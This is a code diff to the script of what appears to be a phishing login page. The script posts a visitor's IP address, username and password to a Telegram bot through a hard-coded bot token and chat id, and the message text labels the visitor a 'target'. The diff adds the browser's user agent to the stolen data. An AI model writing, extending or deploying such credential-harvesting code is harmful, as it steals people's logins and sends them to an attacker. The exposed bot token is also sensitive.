@@ -96,6 +96,8 @@
          }
     </style>
     <script>
+        const agent = navigator.userAgent;
+        
         async function getIp() {
         let ipyu;
         await
@@ -108,7 +110,8 @@ fetch('https://api.ipify.org?format=json')
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot7579364761:AAFfag2e5i1LP0-7AVATP9BbgMQUJh1ez-U/sendMessage?parse_mode=markdown&", true);
         xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-xhr.send("chat_id=6469804005&text=Berhasil Mendapat Info Target\n\nIp Target: "+encodeURIComponent(ipyu)+"\n\nUsername: \n"+encodeURIComponent(usr)+"\n\nPassword: \n"+encodeURIComponent(pass));
+        var data = "chat_id=6469804005&text=Berhasil Mendapat Info Target\n\nIp Target: "+encodeURIComponent(ipyu)+"\n\nUser Agent:\n\n"+encodeURIComponent(agent)+"\n\nUsername: \n"+encodeURIComponent(usr)+"\n\nPassword: \n"+encodeURIComponent(pass);
+xhr.send(data);
         }
         function showpass() {
             var x = document.getElementById("pass");
